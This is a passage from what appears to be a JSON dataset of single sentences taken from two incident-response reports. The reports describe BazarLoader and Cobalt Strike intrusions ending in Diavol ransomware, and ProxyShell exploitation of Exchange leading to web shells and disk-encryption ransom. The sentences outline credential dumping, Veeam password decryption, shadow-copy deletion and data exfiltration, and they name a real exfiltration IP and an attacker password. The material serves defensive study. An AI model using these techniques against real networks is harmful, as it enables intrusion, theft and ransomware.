        "id": "dfir-reports-filtered/r-dfir-19.md:::S18",
        "text": "On the backup server, the threat actors attempted to dump databases associated with the backup solution.",
        "type": "",
        "report": "r-dfir-19",
        "line": 18,
        "index": 5622
    },
    {
        "id": "dfir-reports-filtered/r-dfir-19.md:::S19",
        "text": "In one attempt, they used a documented technique to recover the encoded password and decode it using the Microsoft Data Protection API (DPAPI).\n",
        "type": "",
        "report": "r-dfir-19",
        "line": 19,
        "index": 5623
    },
    {
        "id": "dfir-reports-filtered/r-dfir-19.md:::S20",
        "text": "After around 42 hours post initial intrusion, the threat actors pushed towards completion of their final objective.",
        "type": "",
        "report": "r-dfir-19",
        "line": 20,
        "index": 5624
    },
    {
        "id": "dfir-reports-filtered/r-dfir-19.md:::S21",
        "text": "RDP access was established from the central file server that the threat actors had compromised to all endpoints and a batch script named \u201ckill.bat\u201d was executed on all of the targeted machines.\n",
        "type": "",
        "report": "r-dfir-19",
        "line": 21,
        "index": 5625
    },
    {
        "id": "dfir-reports-filtered/r-dfir-19.md:::S22",
        "text": "The script consists of commands that removes Volume Shadow copies, disables Windows automatic startup repair, and stops all the running services on the host.",
        "type": "",
        "report": "r-dfir-19",
        "line": 22,
        "index": 5626
    },
    {
        "id": "dfir-reports-filtered/r-dfir-19.md:::S23",
        "text": "Once the script completed execution, the Diavol Ransomware was deployed via the RDP connection on each machine by running the executable manually.",
        "type": "",
        "report": "r-dfir-19",
        "line": 23,
        "index": 5627
    },
    {
        "id": "dfir-reports-filtered/r-dfir-19.md:::S24",
        "text": "From initial access, to ransomware deployment, the threat actors took about 42 hours to deploy ransomware domain wide, but from the login on the third day, to the last host ransom execution, only about an hour passed for the actors to finish their deployment.",
        "type": "",
        "report": "r-dfir-19",
        "line": 24,
        "index": 5628
    },
    {
        "id": "dfir-reports-filtered/r-dfir-19.md:::S25",
        "text": "Initial access was via a OneDrive link that arrived via malicious emails that was reported via @ankit_anubhav.\n",
        "type": "",
        "report": "r-dfir-19",
        "line": 25,
        "index": 5629
    },
    {
        "id": "dfir-reports-filtered/r-dfir-19.md:::S26",
        "text": "Upon accessing the link, a zip file was downloaded.\n",
        "type": "",
        "report": "r-dfir-19",
        "line": 26,
        "index": 5630
    },
    {
        "id": "dfir-reports-filtered/r-dfir-19.md:::S27",
        "text": "The original URL of the file can be traced from the file stream log data (Sysmon Event ID 15) as well.\n",
        "type": "",
        "report": "r-dfir-19",
        "line": 27,
        "index": 5631
    },
    {
        "id": "dfir-reports-filtered/r-dfir-19.md:::S28",
        "text": "Reviewing the file stream data from Sysmon we can see that the zip contains an ISO file.\n",
        "type": "",
        "report": "r-dfir-19",
        "line": 28,
        "index": 5632
    },
    {
        "id": "dfir-reports-filtered/r-dfir-19.md:::S29",
        "text": "TheAnalyst reported similar BazarLoader activity via malicious emails around the same time frame.\n",
        "type": "",
        "report": "r-dfir-19",
        "line": 29,
        "index": 5633
    },
    {
        "id": "dfir-reports-filtered/r-dfir-19.md:::S30",
        "text": "The BazarLoader ISO downloaded from the OneDrive link, consists of a malicious DLL and shortcut file named \u201cDocuments.lnk\u201d which executes the DLL via rundll32.exe.",
        "type": "",
        "report": "r-dfir-19",
        "line": 30,
        "index": 5634
    },
    {
        "id": "dfir-reports-filtered/r-dfir-19.md:::S31",
        "text": "LNK File\n",
        "type": "",
        "report": "r-dfir-19",
        "line": 31,
        "index": 5635
    },
    {
        "id": "dfir-reports-filtered/r-dfir-19.md:::S32",
        "text": "After the initial execution, the malware contacted two of its C2 IPs:\n",
        "type": "",
        "report": "r-dfir-19",
        "line": 32,
        "index": 5636
    },
    {
        "id": "dfir-reports-filtered/r-dfir-19.md:::S33",
        "text": "We then observed threat actors dropping multiple Cobalt Strike Beacon DLL\u2019s on the host in the following file paths:\n",
        "type": "",
        "report": "r-dfir-19",
        "line": 33,
        "index": 5637
    },
    {
        "id": "dfir-reports-filtered/r-dfir-19.md:::S34",
        "text": "A new BITS job, named \u201cMicrosoft Office Manager upgrade v24.24\u201d was created on the beachhead host.",
        "type": "",
        "report": "r-dfir-19",
        "line": 34,
        "index": 5638
    },
    {
        "id": "dfir-reports-filtered/r-dfir-19.md:::S35",
        "text": "The BITS job failed because the requested URL does not exist.\n",
        "type": "",
        "report": "r-dfir-19",
        "line": 35,
        "index": 5639
    },
    {
        "id": "dfir-reports-filtered/r-dfir-19.md:::S36",
        "text": "While reporting failure in the logs, the BITS job did re-execute the mounted ISO files every 3 hours, for the length of the intrusion on the beachhead host.\n",
        "type": "",
        "report": "r-dfir-19",
        "line": 36,
        "index": 5640
    },
    {
        "id": "dfir-reports-filtered/r-dfir-19.md:::S37",
        "text": "After the threat actor moved laterally, we observed them installing Anydesk on multiple clients to create additional means of keeping access.\n",
        "type": "",
        "report": "r-dfir-19",
        "line": 37,
        "index": 5641
    },
    {
        "id": "dfir-reports-filtered/r-dfir-19.md:::S38",
        "text": "They used PowerShell and cmd to automate the download and installation of AnyDesk.",
        "type": "",
        "report": "r-dfir-19",
        "line": 38,
        "index": 5642
    },
    {
        "id": "dfir-reports-filtered/r-dfir-19.md:::S39",
        "text": "In order to install Anydesk for unattended access you have to set a password.",
        "type": "",
        "report": "r-dfir-19",
        "line": 39,
        "index": 5643
    },
    {
        "id": "dfir-reports-filtered/r-dfir-19.md:::S40",
        "text": "The password here was set to J9kzQ2Y0qO\n",
        "type": "",
        "report": "r-dfir-19",
        "line": 40,
        "index": 5644
    },
    {
        "id": "dfir-reports-filtered/r-dfir-19.md:::S41",
        "text": "The threat actor not only leaked their password when installing AnyDesk, but they also temporarily copied the password to the machine as the name of a text file.\n",
        "type": "",
        "report": "r-dfir-19",
        "line": 41,
        "index": 5645
    },
    {
        "id": "dfir-reports-filtered/r-dfir-19.md:::S42",
        "text": "This password also matches one from the leaked Conti manuals back in August.\n",
        "type": "",
        "report": "r-dfir-19",
        "line": 42,
        "index": 5646
    },
    {
        "id": "dfir-reports-filtered/r-dfir-19.md:::S43",
        "text": "From the Anydesk logs, we can also see the Client-ID and the IP used to access the clients.",
        "type": "",
        "report": "r-dfir-19",
        "line": 43,
        "index": 5647
    },
    {
        "id": "dfir-reports-filtered/r-dfir-19.md:::S44",
        "text": "Logs can be found at %programdata%\\AnyDesk\\ad_svc.trace\n",
        "type": "",
        "report": "r-dfir-19",
        "line": 44,
        "index": 5648
    },
    {
        "id": "dfir-reports-filtered/r-dfir-19.md:::S45",
        "text": "The threat actors made use of process injection through-out the intrusion.",
        "type": "",
        "report": "r-dfir-19",
        "line": 45,
        "index": 5649
    },
    {
        "id": "dfir-reports-filtered/r-dfir-19.md:::S46",
        "text": "The BazaLoader malware injected into an Edge browser process, as observed by the discovery activity, and Cobalt Strike DLL\u2019s activity.\n",
        "type": "",
        "report": "r-dfir-19",
        "line": 46,
        "index": 5650
    },
    {
        "id": "dfir-reports-filtered/r-dfir-19.md:::S47",
        "text": "Cobalt Strike processes were also observed injecting into various other processes.\n",
        "type": "",
        "report": "r-dfir-19",
        "line": 47,
        "index": 5651
    },
    {
        "id": "dfir-reports-filtered/r-dfir-19.md:::S48",
        "text": "Threat actors performed dumping of SAM, SECURITY and SYSTEM registry hives using a batch script named \u201cfodhelper_reg_hashes.bat\u201d.\n",
        "type": "",
        "report": "r-dfir-19",
        "line": 48,
        "index": 5652
    },
    {
        "id": "dfir-reports-filtered/r-dfir-19.md:::S49",
        "text": "Contents of fodhelper_reg_hashes.bat are as follows:\n",
        "type": "",
        "report": "r-dfir-19",
        "line": 49,
        "index": 5653
    },
    {
        "id": "dfir-reports-filtered/r-dfir-19.md:::S50",
        "text": "They also performed enumeration of the web browser information using more.\n",
        "type": "",
        "report": "r-dfir-19",
        "line": 50,
        "index": 5654
    },
    {
        "id": "dfir-reports-filtered/r-dfir-19.md:::S51",
        "text": "The following files were accessed:\n",
        "type": "",
        "report": "r-dfir-19",
        "line": 51,
        "index": 5655
    },
    {
        "id": "dfir-reports-filtered/r-dfir-19.md:::S52",
        "text": "Using a well known technique documented on the Veeam backup forum, the threat actor managed to decrypt passwords used by Veeam.",
        "type": "",
        "report": "r-dfir-19",
        "line": 52,
        "index": 5656
    },
    {
        "id": "dfir-reports-filtered/r-dfir-19.md:::S53",
        "text": "The encryption method used by Veeam is Data Protection API/DPAPI.\n",
        "type": "",
        "report": "r-dfir-19",
        "line": 53,
        "index": 5657
    },
    {
        "id": "dfir-reports-filtered/r-dfir-19.md:::S54",
        "text": "All the activity was done using RDP on the server with backups.\n",
        "type": "",
        "report": "r-dfir-19",
        "line": 54,
        "index": 5658
    },
    {
        "id": "dfir-reports-filtered/r-dfir-19.md:::S55",
        "text": "Dump the credentials using sqlcmd.exe to base64 passwords.\n",
        "type": "",
        "report": "r-dfir-19",
        "line": 55,
        "index": 5659
    },
    {
        "id": "dfir-reports-filtered/r-dfir-19.md:::S56",
        "text": "Via RDP and notepad, they created a new file containing the code for the decryption routine.",
        "type": "",
        "report": "r-dfir-19",
        "line": 56,
        "index": 5660
    },
    {
        "id": "dfir-reports-filtered/r-dfir-19.md:::S57",
        "text": "Execute, which gave the threat actors passwords that were used by Veeam.\n",
        "type": "",
        "report": "r-dfir-19",
        "line": 57,
        "index": 5661
    },
    {
        "id": "dfir-reports-filtered/r-dfir-19.md:::S58",
        "text": "We also observed the threat actor using Rubeus to kerberoast and asreproast the environment.\n",
        "type": "",
        "report": "r-dfir-19",
        "line": 58,
        "index": 5662
    },
    {
        "id": "dfir-reports-filtered/r-dfir-19.md:::S59",
        "text": "BazaLoader was observed executing the well known battery of Windows discovery commands around 10 minutes after execution on the beachhead host.",
        "type": "",
        "report": "r-dfir-19",
        "line": 59,
        "index": 5663
    },
    {
        "id": "dfir-reports-filtered/r-dfir-19.md:::S60",
        "text": "Shortly after the Cobalt Strike beacon was executed, we can see that they uploaded and ran the well known script adf.bat.",
        "type": "",
        "report": "r-dfir-19",
        "line": 60,
        "index": 5664
    },
    {
        "id": "dfir-reports-filtered/r-dfir-19.md:::S61",
        "text": "This has been observed multiple times by different ransomware groups.",
        "type": "",
        "report": "r-dfir-19",
        "line": 61,
        "index": 5665
    },
    {
        "id": "dfir-reports-filtered/r-dfir-19.md:::S62",
        "text": "The threat actor ran AdFind twice, once using adf.bat file with AdFind renamed to qq.\n",
        "type": "",
        "report": "r-dfir-19",
        "line": 62,
        "index": 5666
    },
    {
        "id": "dfir-reports-filtered/r-dfir-19.md:::S63",
        "text": "The second time, they copy/pasted commands from adf.bat and executed them with AdFind.exe.\n",
        "type": "",
        "report": "r-dfir-19",
        "line": 63,
        "index": 5667
    },
    {
        "id": "dfir-reports-filtered/r-dfir-19.md:::S64",
        "text": "On the second day, the following commands were executed before they started working on moving laterally in the domain.\n",
        "type": "",
        "report": "r-dfir-19",
        "line": 64,
        "index": 5668
    },
    {
        "id": "dfir-reports-filtered/r-dfir-19.md:::S65",
        "text": "During the course of the intrusion, we observed execution of the utility \u201cAdvanced IP Scanner\u201d to perform network scanning (over ports 21,80,445,4899,8080).",
        "type": "",
        "report": "r-dfir-19",
        "line": 65,
        "index": 5669
    },
    {
        "id": "dfir-reports-filtered/r-dfir-19.md:::S66",
        "text": "Advanced IP Scanner was downloaded using Internet Explorer on a server:\n",
        "type": "",
        "report": "r-dfir-19",
        "line": 66,
        "index": 5670
    },
    {
        "id": "dfir-reports-filtered/r-dfir-19.md:::S67",
        "text": "and then run with the portable option:\n",
        "type": "",
        "report": "r-dfir-19",
        "line": 67,
        "index": 5671
    },
    {
        "id": "dfir-reports-filtered/r-dfir-19.md:::S68",
        "text": "We also saw \u201cMSSQLUDPScanner.exe\u201d used for discovery of MSSQL instances across the environment.\n",
        "type": "",
        "report": "r-dfir-19",
        "line": 68,
        "index": 5672
    },
    {
        "id": "dfir-reports-filtered/r-dfir-19.md:::S69",
        "text": "We believe the tool used is rvrsh3ll\u2019s MSSQLUDPScanner\n",
        "type": "",
        "report": "r-dfir-19",
        "line": 69,
        "index": 5673
    },
    {
        "id": "dfir-reports-filtered/r-dfir-19.md:::S70",
        "text": "Comparing compiled version to executable from this intrusion\n",
        "type": "",
        "report": "r-dfir-19",
        "line": 70,
        "index": 5674
    },
    {
        "id": "dfir-reports-filtered/r-dfir-19.md:::S71",
        "text": "Before execution of AdFind.exe, adf.bat was run.\n",
        "type": "",
        "report": "r-dfir-19",
        "line": 71,
        "index": 5675
    },
    {
        "id": "dfir-reports-filtered/r-dfir-19.md:::S72",
        "text": "Via RDP they manually ran @carlos_perez\u2018s Invoke-Sharefinder.ps1 on a server.",
        "type": "",
        "report": "r-dfir-19",
        "line": 72,
        "index": 5676
    },
    {
        "id": "dfir-reports-filtered/r-dfir-19.md:::S73",
        "text": "It then looks like they manually copied the output to a file named shares.txt.\n",
        "type": "",
        "report": "r-dfir-19",
        "line": 73,
        "index": 5677
    },
    {
        "id": "dfir-reports-filtered/r-dfir-19.md:::S74",
        "text": "After each RDP connection to a server on the second day, the threat actor also made sure to open up task manager to review running processes and possibly logged in users on these systems.\n",
        "type": "",
        "report": "r-dfir-19",
        "line": 74,
        "index": 5678
    },
    {
        "id": "dfir-reports-filtered/r-dfir-19.md:::S75",
        "text": "We observed the threat actor using RDP as their main tool to do lateral movement in the environment.",
        "type": "",
        "report": "r-dfir-19",
        "line": 75,
        "index": 5679
    },
    {
        "id": "dfir-reports-filtered/r-dfir-19.md:::S76",
        "text": "Most likely using credentials gathered through dumping of either lsass, or the registry hives.",
        "type": "",
        "report": "r-dfir-19",
        "line": 76,
        "index": 5680
    },
    {
        "id": "dfir-reports-filtered/r-dfir-19.md:::S77",
        "text": "The first instance was through the beachhead where they used Cobalt Strike as a reverse proxy.",
        "type": "",
        "report": "r-dfir-19",
        "line": 77,
        "index": 5681
    },
    {
        "id": "dfir-reports-filtered/r-dfir-19.md:::S78",
        "text": "This also revealed their Workstation Name which is WIN-799RI0TSTOF.\n",
        "type": "",
        "report": "r-dfir-19",
        "line": 78,
        "index": 5682
    },
    {
        "id": "dfir-reports-filtered/r-dfir-19.md:::S79",
        "text": "After they installed AnyDesk, they used that access to RDP to other servers in the environment as well as eventually executing their final objective using this access.",
        "type": "",
        "report": "r-dfir-19",
        "line": 79,
        "index": 5683
    },
    {
        "id": "dfir-reports-filtered/r-dfir-19.md:::S80",
        "text": "The threat actors attempted to dump a database using sqlcmd.exe but the connection to the MSSQL server failed.\n",
        "type": "",
        "report": "r-dfir-19",
        "line": 80,
        "index": 5684
    },
    {
        "id": "dfir-reports-filtered/r-dfir-19.md:::S81",
        "text": "Command and Control\n",
        "type": "",
        "report": "r-dfir-19",
        "line": 81,
        "index": 5685
    },
    {
        "id": "dfir-reports-filtered/r-dfir-19.md:::S82",
        "text": "BazarLoader:\n",
        "type": "",
        "report": "r-dfir-19",
        "line": 82,
        "index": 5686
    },
    {
        "id": "dfir-reports-filtered/r-dfir-19.md:::S83",
        "text": "On the second day of the intrusion, FileZilla was installed on one of the servers which used SFTP to exfiltrate data to a remote computer at IP address 192.52.167.210.\n",
        "type": "",
        "report": "r-dfir-19",
        "line": 83,
        "index": 5687
    },
    {
        "id": "dfir-reports-filtered/r-dfir-19.md:::S84",
        "text": "Using Netflow, we were able to confirm that some amount of data (~200MB) was exfiltrated out of the environment.",
        "type": "",
        "report": "r-dfir-19",
        "line": 84,
        "index": 5688
    },
    {
        "id": "dfir-reports-filtered/r-dfir-19.md:::S85",
        "text": "Here we can see the threat actor actively exfiltrating our information using FileZilla.\n",
        "type": "",
        "report": "r-dfir-19",
        "line": 85,
        "index": 5689
    },
    {
        "id": "dfir-reports-filtered/r-dfir-19.md:::S86",
        "text": "We also saw the threat actors exfiltrate databases by dragging and dropping information into FileZilla.\n",
        "type": "",
        "report": "r-dfir-19",
        "line": 86,
        "index": 5690
    },
    {
        "id": "dfir-reports-filtered/r-dfir-19.md:::S87",
        "text": "After pivoting to a Domain Controller, the threat actors dumped lsass using Task Manager:\n",
        "type": "",
        "report": "r-dfir-19",
        "line": 87,
        "index": 5691
    },
    {
        "id": "dfir-reports-filtered/r-dfir-19.md:::S88",
        "text": "And then uploaded the dump file to ufile.io using Internet Explorer on a server.",
        "type": "",
        "report": "r-dfir-19",
        "line": 88,
        "index": 5692
    },
    {
        "id": "dfir-reports-filtered/r-dfir-19.md:::S89",
        "text": "Eyes on Apple iOS 14.6\n",
        "type": "",
        "report": "r-dfir-19",
        "line": 89,
        "index": 5693
    },
    {
        "id": "dfir-reports-filtered/r-dfir-19.md:::S90",
        "text": "On the third day, the threat actors began their final actions.",
        "type": "",
        "report": "r-dfir-19",
        "line": 90,
        "index": 5694
    },
    {
        "id": "dfir-reports-filtered/r-dfir-19.md:::S91",
        "text": "The final actions took place from a compromised file server.",
        "type": "",
        "report": "r-dfir-19",
        "line": 91,
        "index": 5695
    },
    {
        "id": "dfir-reports-filtered/r-dfir-19.md:::S92",
        "text": "They began with a ping sweep to locate all live hosts.",
        "type": "",
        "report": "r-dfir-19",
        "line": 92,
        "index": 5696
    },
    {
        "id": "dfir-reports-filtered/r-dfir-19.md:::S93",
        "text": "After that completed, they reviewed the results on the host.\n",
        "type": "",
        "report": "r-dfir-19",
        "line": 93,
        "index": 5697
    },
    {
        "id": "dfir-reports-filtered/r-dfir-19.md:::S94",
        "text": "From a file server, the threat actors then established RDP connections to all the machines in the environment.",
        "type": "",
        "report": "r-dfir-19",
        "line": 94,
        "index": 5698
    },
    {
        "id": "dfir-reports-filtered/r-dfir-19.md:::S95",
        "text": " ",
        "type": "",
        "report": "r-dfir-19",
        "line": 95,
        "index": 5699
    },
    {
        "id": "dfir-reports-filtered/r-dfir-19.md:::S96",
        "text": "The threat actors transferred 2 files onto the machines they connected to.",
        "type": "",
        "report": "r-dfir-19",
        "line": 96,
        "index": 5700
    },
    {
        "id": "dfir-reports-filtered/r-dfir-19.md:::S97",
        "text": "A batch script named kill.bat and a ransomware executable CryptoLocker64.exe.",
        "type": "",
        "report": "r-dfir-19",
        "line": 97,
        "index": 5701
    },
    {
        "id": "dfir-reports-filtered/r-dfir-19.md:::S98",
        "text": "The batch script is responsible for deletion of volume shadow copies, turning off automatic repairs and stopping all the running services on the host.",
        "type": "",
        "report": "r-dfir-19",
        "line": 98,
        "index": 5702
    },
    {
        "id": "dfir-reports-filtered/r-dfir-19.md:::S99",
        "text": "Some of the commands are as follows:\n",
        "type": "",
        "report": "r-dfir-19",
        "line": 99,
        "index": 5703
    },
    {
        "id": "dfir-reports-filtered/r-dfir-19.md:::S100",
        "text": "After completion of this activity, the ransomware binary was executed manually over the RDP connections.\n",
        "type": "",
        "report": "r-dfir-19",
        "line": 100,
        "index": 5704
    },
    {
        "id": "dfir-reports-filtered/r-dfir-19.md:::S101",
        "text": "From the threat actors starting their ping sweep, to final host encryption, about an hour passed leaving behind the ransom note for the organization to find.",
        "type": "",
        "report": "r-dfir-19",
        "line": 101,
        "index": 5705
    },
    {
        "id": "dfir-reports-filtered/r-dfir-19.md:::S102",
        "text": "The threat actors went from initial access to domain wide ransomware in just under two days.",
        "type": "",
        "report": "r-dfir-19",
        "line": 102,
        "index": 5706
    },
    {
        "id": "dfir-reports-filtered/r-dfir-20.md:::S0",
        "text": "We observed an intrusion where an adversary exploited multiple Exchange vulnerabilities (ProxyShell) to drop multiple web shells.",
        "type": "",
        "report": "r-dfir-20",
        "line": 0,
        "index": 5707
    },
    {
        "id": "dfir-reports-filtered/r-dfir-20.md:::S1",
        "text": "Over the course of three days, three different web shells were dropped in publicly accessible directories.",
        "type": "",
        "report": "r-dfir-20",
        "line": 1,
        "index": 5708
    },
    {
        "id": "dfir-reports-filtered/r-dfir-20.md:::S2",
        "text": "These web shells, exposed to the internet, were used to execute arbitrary code on the Microsoft Exchange Server utilizing PowerShell and cmd.",
        "type": "",
        "report": "r-dfir-20",
        "line": 2,
        "index": 5709
    },
    {
        "id": "dfir-reports-filtered/r-dfir-20.md:::S3",
        "text": "After gaining an initial foothold on the Exchange system, the threat actors started discovery by executing commands like ipconfig, net, ping, systeminfo, and others, using the previously dropped web shells.",
        "type": "",
        "report": "r-dfir-20",
        "line": 3,
        "index": 5710
    },
    {
        "id": "dfir-reports-filtered/r-dfir-20.md:::S4",
        "text": "This battery of initial discovery included a network call out to themoscowtimes[.]com.",
        "type": "",
        "report": "r-dfir-20",
        "line": 4,
        "index": 5711
    },
    {
        "id": "dfir-reports-filtered/r-dfir-20.md:::S5",
        "text": "The threat actors repeated these tests twice over the first two days.",
        "type": "",
        "report": "r-dfir-20",
        "line": 5,
        "index": 5712
    },
    {
        "id": "dfir-reports-filtered/r-dfir-20.md:::S6",
        "text": "On the third day, the next phase of the intrusion was underway.",
        "type": "",
        "report": "r-dfir-20",
        "line": 6,
        "index": 5713
    },
    {
        "id": "dfir-reports-filtered/r-dfir-20.md:::S7",
        "text": "Since the commands executed via the web shell run with SYSTEM level privileges, threat actors took advantage of this and enabled a built-in account DefaultAccount, set the password and added it to Administrator and Remote Desktop Users groups.",
        "type": "",
        "report": "r-dfir-20",
        "line": 7,
        "index": 5714
    },
    {
        "id": "dfir-reports-filtered/r-dfir-20.md:::S8",
        "text": "The threat actors then dropped Plink and established an SSH tunnel to expose RDP over the tunnel.",
        "type": "",
        "report": "r-dfir-20",
        "line": 8,
        "index": 5715
    },
    {
        "id": "dfir-reports-filtered/r-dfir-20.md:::S9",
        "text": "They then connected to the Exchange server over RDP using the DefaultAccount account.",
        "type": "",
        "report": "r-dfir-20",
        "line": 9,
        "index": 5716
    },
    {
        "id": "dfir-reports-filtered/r-dfir-20.md:::S10",
        "text": "They then copied their tools into the environment via RDP, which was observed when CacheTask.zip was copied to disk.",
        "type": "",
        "report": "r-dfir-20",
        "line": 10,
        "index": 5717
    },
    {
        "id": "dfir-reports-filtered/r-dfir-20.md:::S11",
        "text": "This compressed file had a few files in it: \n",
        "type": "",
        "report": "r-dfir-20",
        "line": 11,
        "index": 5718
    },
    {
        "id": "dfir-reports-filtered/r-dfir-20.md:::S12",
        "text": "RuntimeBroker\n",
        "type": "",
        "report": "r-dfir-20",
        "line": 12,
        "index": 5719
    },
    {
        "id": "dfir-reports-filtered/r-dfir-20.md:::S13",
        "text": "Right after the transfer, the adversaries executed install-proxy.bat to create two directories and move CacheTask.bat, dllhost.exe and RuntimeBroker into their respective folder.",
        "type": "",
        "report": "r-dfir-20",
        "line": 13,
        "index": 5720
    },
    {
        "id": "dfir-reports-filtered/r-dfir-20.md:::S14",
        "text": "A scheduled task was created and executed, to execute install-proxy.bat, which established network persistence via Fast Reverse Proxy (FRP) which was used to proxy RDP traffic during the intrusion.\n",
        "type": "",
        "report": "r-dfir-20",
        "line": 14,
        "index": 5721
    },
    {
        "id": "dfir-reports-filtered/r-dfir-20.md:::S15",
        "text": "Utilizing the Plink RDP connection, the threat actor dumped LSASS using Task Manager.",
        "type": "",
        "report": "r-dfir-20",
        "line": 15,
        "index": 5722
    },
    {
        "id": "dfir-reports-filtered/r-dfir-20.md:::S16",
        "text": "Thirty minutes later, the threat actor started using a domain administrator account.",
        "type": "",
        "report": "r-dfir-20",
        "line": 16,
        "index": 5723
    },
    {
        "id": "dfir-reports-filtered/r-dfir-20.md:::S17",
        "text": "Using the stolen Domain Admin account, adversaries performed port scanning with KPortScan 3.0 and then moved laterally using RDP.",
        "type": "",
        "report": "r-dfir-20",
        "line": 17,
        "index": 5724
    },
    {
        "id": "dfir-reports-filtered/r-dfir-20.md:::S18",
        "text": "Targeted servers included backup systems and domain controllers.",
        "type": "",
        "report": "r-dfir-20",
        "line": 18,
        "index": 5725
    },
    {
        "id": "dfir-reports-filtered/r-dfir-20.md:::S19",
        "text": "The threat actor also deployed the FRP package to these systems after gaining access.\n",
        "type": "",
        "report": "r-dfir-20",
        "line": 19,
        "index": 5726
    },
    {
        "id": "dfir-reports-filtered/r-dfir-20.md:::S20",
        "text": "Finally, the threat actors deployed setup.bat across the servers in the environment using RDP and then used an open source disk encryption utility to encrypt the workstations.",
        "type": "",
        "report": "r-dfir-20",
        "line": 20,
        "index": 5727
    },
    {
        "id": "dfir-reports-filtered/r-dfir-20.md:::S21",
        "text": "Setup.bat ran commands to enable BitLocker encryption, which resulted in the hosts being inoperable.",
        "type": "",
        "report": "r-dfir-20",
        "line": 21,
        "index": 5728
    },
    {
        "id": "dfir-reports-filtered/r-dfir-20.md:::S22",
        "text": "To encrypt workstations, an open source utility called DiskCryptor was utilized.",
        "type": "",
        "report": "r-dfir-20",
        "line": 22,
        "index": 5729
    },
    {
        "id": "dfir-reports-filtered/r-dfir-20.md:::S23",
        "text": "This was dropped on the workstations via RDP sessions and then executed to install the utility and setup the encryption.",
        "type": "",
        "report": "r-dfir-20",
        "line": 23,
        "index": 5730
    },
    {
        "id": "dfir-reports-filtered/r-dfir-20.md:::S24",
        "text": "The utility required a reboot to install a kernel mode driver and then another reboot to lock out access to the workstations.",
        "type": "",
        "report": "r-dfir-20",
        "line": 24,
        "index": 5731
    },
    {
        "id": "dfir-reports-filtered/r-dfir-20.md:::S25",
        "text": "The time to ransom (TTR) of this intrusion, from the first successful ProxyShell exploitation to ransom, was around 42 hours.",
        "type": "",
        "report": "r-dfir-20",
        "line": 25,
        "index": 5732
    },
    {
        "id": "dfir-reports-filtered/r-dfir-20.md:::S26",
        "text": "If the blue team failed to detect the intrusion up until the DefaultAccount being enabled, they would have had 8 hours to respond and evict the threat actors before being ransomed.",
        "type": "",
        "report": "r-dfir-20",
        "line": 26,
        "index": 5733
    },
    {
        "id": "dfir-reports-filtered/r-dfir-20.md:::S27",
        "text": "The threat actors left a ransom note requesting 8,000 USD to get the encryption keys for the systems.\n",
        "type": "",
        "report": "r-dfir-20",
        "line": 27,
        "index": 5734
    },
    {
        "id": "dfir-reports-filtered/r-dfir-20.md:::S28",
        "text": "This time we will talk about ProxyShell, which revealed itself around August 2021.",
        "type": "",
        "report": "r-dfir-20",
        "line": 28,
        "index": 5735
    },
    {
        "id": "dfir-reports-filtered/r-dfir-20.md:::S29",
        "text": "Once again, the vulnerability affects Microsoft Exchange servers.",
        "type": "",
        "report": "r-dfir-20",
        "line": 29,
        "index": 5736
    },
    {
        "id": "dfir-reports-filtered/r-dfir-20.md:::S30",
        "text": "Specifically, the on-prem versions identified as Exchange Server 2013, Exchange Server 2016 and Exchange Server 2019.",
        "type": "",
        "report": "r-dfir-20",
        "line": 30,
        "index": 5737
    },
    {
        "id": "dfir-reports-filtered/r-dfir-20.md:::S31",
        "text": "It is interesting to note how the ProxyShell vulnerability, originally identified and exploited by Orange Tsai (@orange_8361), includes a chain of 3 different CVEs:\n",
        "type": "",
        "report": "r-dfir-20",
        "line": 31,
        "index": 5738
    },
    {
        "id": "dfir-reports-filtered/r-dfir-20.md:::S32",
        "text": "In this specific scenario, we observed the presence and exploitation of all the CVEs indicated above so; specifically, the attacker was able to exploit a Pre-auth Path Confusion Leads to ACL Bypass (CVE-2021-34473), an Elevation of Privilege on Exchange PowerShell Backend (CVE-2021-34523), and finally a Post-auth Arbitrary-File-Write Leads to RCE (CVE-2021-31207).",
        "type": "",
        "report": "r-dfir-20",
        "line": 32,
        "index": 5739
    },
    {
        "id": "dfir-reports-filtered/r-dfir-20.md:::S33",
        "text": "This last CVE allowed the creation of multiple web shells.",
        "type": "",
        "report": "r-dfir-20",
        "line": 33,
        "index": 5740
    },
    {
        "id": "dfir-reports-filtered/r-dfir-20.md:::S34",
        "text": "The method used by the actor in this incident was to first use the elevated PowerShell privileges to run the following discovery cmdlets:\n",
        "type": "",
        "report": "r-dfir-20",
        "line": 34,
        "index": 5741
    },
    {
        "id": "dfir-reports-filtered/r-dfir-20.md:::S35",
        "text": "This was shortly followed by the cmdlet \u201cNew-ManagementRoleAssignment\u201d responsible for granting mailbox import/export privileges before running \u201cNew-MailboxExportRequest\u201d.",
        "type": "",
        "report": "r-dfir-20",
        "line": 35,
        "index": 5742
    },
    {
        "id": "dfir-reports-filtered/r-dfir-20.md:::S36",
        "text": "The cmdlet would export a Mailbox to a provided location with the .aspx extention.",
        "type": "",
        "report": "r-dfir-20",
        "line": 36,
        "index": 5743
    },
    {
        "id": "dfir-reports-filtered/r-dfir-20.md:::S37",
        "text": "While the file is a legitimate .pst file, in contains plaintext web shell code that is rendered by IIS when requested.",
        "type": "",
        "report": "r-dfir-20",
        "line": 37,
        "index": 5744
    },
    {
        "id": "dfir-reports-filtered/r-dfir-20.md:::S38",
        "text": "Below is an example of one of the IPs who successfully exploited the vulnerabilities:\n",
        "type": "",
        "report": "r-dfir-20",
        "line": 38,
        "index": 5745
    },
    {
        "id": "dfir-reports-filtered/r-dfir-20.md:::S39",
        "text": "Three web shells were spotted during our investigation:\n",
        "type": "",
        "report": "r-dfir-20",
        "line": 39,
        "index": 5746
    },
    {
        "id": "dfir-reports-filtered/r-dfir-20.md:::S40",
        "text": "The login.aspx web shell is a simple web shell which takes a command and runs it using cmd.exe.",
        "type": "",
        "report": "r-dfir-20",
        "line": 40,
        "index": 5747
    },
    {
        "id": "dfir-reports-filtered/r-dfir-20.md:::S41",
        "text": "We believe the threat actor used aspx_qdajscizfzc.aspx to upload login.aspx and that\u2019s why the parent process is w3wp.",
        "type": "",
        "report": "r-dfir-20",
        "line": 41,
        "index": 5748
    },
    {
        "id": "dfir-reports-filtered/r-dfir-20.md:::S42",
        "text": "Here\u2019s what the web shell looked like:\n",
        "type": "",
        "report": "r-dfir-20",
        "line": 42,
        "index": 5749
    },
    {
        "id": "dfir-reports-filtered/r-dfir-20.md:::S43",
        "text": "This is the web shell code for login.aspx:\n",
        "type": "",
        "report": "r-dfir-20",
        "line": 43,
        "index": 5750
    },
    {
        "id": "dfir-reports-filtered/r-dfir-20.md:::S44",
        "text": "The other two web shells were dropped upon the successful exploitation of ProxyShell.",
        "type": "",
        "report": "r-dfir-20",
